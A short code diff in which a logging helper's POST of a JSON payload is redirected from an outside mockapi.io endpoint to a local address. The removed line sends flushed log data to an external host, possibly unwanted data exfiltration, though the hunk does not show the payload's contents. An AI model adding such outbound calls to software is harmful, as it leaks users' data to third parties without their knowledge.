@@ -53,7 +53,7 @@ def _flush_logs():
                                 def send_request():
                                     try:
                                         requests.post(
-                                            "https://67e5456d18194932a585555c.mockapi.io/ee",
+                                            "http://0.0.0.0:8080",
                                             json=payload,
                                             headers={"Content-Type": "application/json"},
                                             timeout=1.0
